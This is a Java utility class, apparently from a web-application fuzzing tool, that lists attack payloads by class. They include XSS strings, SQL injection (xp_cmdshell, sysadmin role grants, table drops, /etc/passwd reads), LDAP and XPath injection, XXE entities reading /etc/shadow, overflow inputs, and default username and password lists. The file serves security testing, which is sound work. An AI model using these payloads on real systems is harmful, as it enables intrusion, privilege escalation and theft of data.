package utils;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import org.apache.commons.lang3.ArrayUtils;
import org.apache.commons.lang3.StringUtils;

public class FuzzVectors {

    private static List<String[]> allVectors = new ArrayList<String[]>();

    private static String XSSAttacks[] = {
            ">\"><script>alert(\"XSS\")</script>&",
            "><STYLE>@import\"javascript:alert('XSS')\";</STYLE>",
            ">\"'><img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;",
            " alert(%26quot;%26%23x20;XSS%26%23x20;Test%26%23x20;Successful%26quot;)>",
            ">%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>",
            "'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'",
            "\">",
            ">\"",
            "'';!--\"<XSS>=&{()}",
            "<IMG SRC=\"javascript:alert('XSS');\">",
            "<IMG SRC=javascript:alert('XSS')>",
            "<IMG SRC=JaVaScRiPt:alert('XSS')> ",
            "<IMG SRC=JaVaScRiPt:alert(&quot;XSS<WBR>&quot;)>",
            "<IMGSRC=&#106;&#97;&#118;&#97;&<WBR>#115;&#99;&#114;&#105;&#112;&<WBR>#116;&#58;&#97;",
            " &#108;&#101;&<WBR>#114;&#116;&#40;&#39;&#88;&#83<WBR>;&#83;&#39;&#41>",
            "<IMGSRC=&#0000106&#0000097&<WBR>#0000118&#0000097&#0000115&<WBR>#0000099&#0000114&#0000105&<WBR>#0000112&#0000116&#0000058",
            " &<WBR>#0000097&#0000108&#0000101&<WBR>#0000114&#0000116&#0000040&<WBR>#0000039&#0000088&#0000083&<WBR>#0000083&#0000039&#0000041>",
            "<IMGSRC=&#x6A&#x61&#x76&#x61&#x73&<WBR>#x63&#x72&#x69&#x70&#x74&#x3A&<WBR>#x61&#x6C&#x65&#x72&#x74&#x28",
            " &<WBR>#x27&#x58&#x53&#x53&#x27&#x29>",
            "<IMG SRC=\"jav&#x09;ascript:alert(<WBR>'XSS');\">",
            "<IMG SRC=\"jav&#x0A;ascript:alert(<WBR>'XSS');\">",
            "<IMG SRC=\"jav&#x0D;ascript:alert(<WBR>'XSS');\">" };

    private static String bufferOverflowAttacks[] = {
            StringUtils.repeat('A', 5), StringUtils.repeat('A', 17),
            StringUtils.repeat('A', 33), StringUtils.repeat('A', 65),
            StringUtils.repeat('A', 129), StringUtils.repeat('A', 257),
            StringUtils.repeat('A', 513), StringUtils.repeat('A', 1024),
            StringUtils.repeat('A', 2049), StringUtils.repeat('A', 4097),
            StringUtils.repeat('A', 8193), StringUtils.repeat('A', 12288), };

    private static String intOverflowAttacks[] = { "-1", "0", "0x100",
            "0x1000", "0x3fffffff", "0x7ffffffe", "0x7fffffff", "0x80000000",
            "0xfffffffe", "0xffffffff", "0x10000", "0x100000" };

    private static String passSQLInjectAttacks[] = {
            "'||(elt(-3+5,bin(15),ord(10),hex(char(45))))",
            "||6",
            "'||'6",
            "\"(||6)",
            "' OR 1=1-- ",
            "OR 1=1",
            "' OR '1'='1",
            "; OR '1'='1'",
            "%22+or+isnull%281%2F0%29+%2F*",
            "%27+OR+%277659%27%3D%277659",
            "%22+or+isnull%281%2F0%29+%2F*",
            "%27+--+",
            "' or 1=1--",
            "\" or 1=1--",
            "' or 1=1 /*",
            "or 1=1--",
            "' or 'a'='a",
            "\" or \"a\"=\"a",
            "') or ('a'='a",
            "Admin' OR '",
            "') or 1 = 1; --",
            "'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--",
            ") UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;",
            "' having 1=1--",
            "' having 1=1--",
            "' group by userid having 1=1--",
            "' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--",
            "' or 1 in (select @@version)--",
            "' union all select @@version--",
            "' OR 'unusual' = 'unusual'",
            "' OR 'something' = 'some'+'thing'",
            "' OR 'text' = N'text'",
            "' OR 'something' like 'some%'",
            "' OR 2 > 1",
            "' OR 'text' > 't'",
            "' OR 'whatever' in ('whatever')",
            "' OR 2 BETWEEN 1 and 3",
            "' or username like char(37);",
            "' union select * from users where login = char(114,111,111,116);",
            "' union select ",
            "Password:*/=1--",
            "UNI/**/ON SEL/**/ECT",
            "'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'",
            "'; EXEC ('SEL' + 'ECT US' + 'ER')",
            "'/**/OR/**/1/**/=/**/1",
            "' or 1/*",
            "+or+isnull%281%2F0%29+%2F*",
            "%27+OR+%277659%27%3D%277659",
            "%22+or+isnull%281%2F0%29+%2F*",
            "%27+--+&password=",
            "'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > ",
            " @var select @var as var into temp end --",
            "' and 1 in (select var from temp)--",
            "' union select 1,load_file('/etc/passwd'),1,1,1;",
            "1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;",
            "' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));" };

    private static String activeSQLInjectAttacks[] = {
            "'; exec master..xp_cmdshell 'ping 10.10.1.2'--",
            "CREATE USER name IDENTIFIED BY 'pass123'",
            "CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; ",
            "' ; drop table temp --",
            "exec sp_addlogin 'name' , 'password'",
            "exec sp_addsrvrolemember 'name' , 'sysadmin'",
            "INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))",
            "GRANT CONNECT TO name; GRANT RESOURCE TO name;",
            "INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) ",
            " + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)", };

    private static String LDAPInjectAttacks[] = { "|", "!", "(", ")", "%28",
            "%29", "&", "%26", "%21", "%7C", "*|", "%2A%7C", "*(|(mail=*))",
            "%2A%28%7C%28mail%3D%2A%29%29", "*(|(objectclass=*))",
            "%2A%28%7C%28objectclass%3D%2A%29%29", "*()|%26'", "admin*",
            "admin*)((|userPassword=*)", "*)(uid=*))(|(uid=*", };

    private static String xpathAttacks[] = { "'+or+'1'='1", "'+or+''='",
            "x'+or+1=1+or+'x'='y", "/", "//", "//*", "*/*", "@*",
            "count(/child::node())", "x'+or+name()='username'+or+'x'='y", };

    private static String XMLInjectAttacks[] = {
            "<![CDATA[<script>var n=0;while(true){n++;}</script>]]>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('gotcha');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><foo><![CDATA[' or 1=1 or ''=']]></foof>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file://c:/boot.ini\">]><foo>&xee;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xee;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xee;</foo>",
            "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM \"file:///dev/random\">]><foo>&xee;</foo>", };

    private static String commonUserNames[] = { "admin", "administrator",
            "test", "anonymous", "guest", "user", "root", "info", "adm",
            "mysql", "oracle", "tomcat6", "www-data", "www", "log", "apache",
            "email" };

    private static String commonPasswords[] = { "admin", "administrator",
            "test", "anonymous", "guest", "user", "", "root", "info", "adm",
            "mysql", " ", "oracle", "tomcat6", "www-data", "www", "log",
            "apache", "email", "test" };

    private static String commonPages[] = { "index", "admin", "users",
            "user", "administrator", "about ", "faq", "contact", "news",
            "login", "home", "blog", "feed", "images", "pages", "catalog",
            "resources", "customer", "articles" };

    static {
        allVectors.add(activeSQLInjectAttacks);
        allVectors.add(bufferOverflowAttacks);
        allVectors.add(intOverflowAttacks);
        allVectors.add(LDAPInjectAttacks);
        allVectors.add(passSQLInjectAttacks);
        allVectors.add(XMLInjectAttacks);
        allVectors.add(xpathAttacks);
        allVectors.add(XSSAttacks);
        allVectors.add(commonPasswords);
        allVectors.add(commonUserNames);
    }

    public static List<String> getAllVectorStrings() {
        List<String> allVectorStrings = new ArrayList<String>();
        for (String[] vectorList : getAllVectors()) {
            allVectorStrings.addAll(Arrays.asList(vectorList));
        }
        return allVectorStrings;
    }

    public static List<String[]> getAllVectors() {
        return allVectors;
    }

    public static String[] getAllVectorClasses() {
        return new String[] { "activeSQL", "string", "int", "xss",
                "passiveSQL", "ldap", "xpath", "xml", "usernames",
                "passwords" };
    }

    public static String[] getAttackClass(final String attackClass) {
        if (attackClass.equals("xss")) {
            return XSSAttacks;
        } else if (attackClass.equals("string")) {
            return bufferOverflowAttacks;
        } else if (attackClass.equals("int")) {
            return intOverflowAttacks;
        } else if (attackClass.equals("passiveSQL")) {
            return passSQLInjectAttacks;
        } else if (attackClass.equals("activeSQL")) {
            return activeSQLInjectAttacks;
        } else if (attackClass.equals("ldap")) {
            return LDAPInjectAttacks;
        } else if (attackClass.equals("xpath")) {
            return xpathAttacks;
        } else if (attackClass.equals("xml")) {
            return XMLInjectAttacks;
        } else if (attackClass.equals("sql")) {
            return ArrayUtils.addAll(passSQLInjectAttacks,
                    activeSQLInjectAttacks);
        } else if (attackClass.equals("passwords")) {
            return commonPasswords;
        } else if (attackClass.equals("usernames")) {
            return commonUserNames;
        }

        return null;
    }

    public static String[] getCommonPages() {
        return commonPages;
    }

}
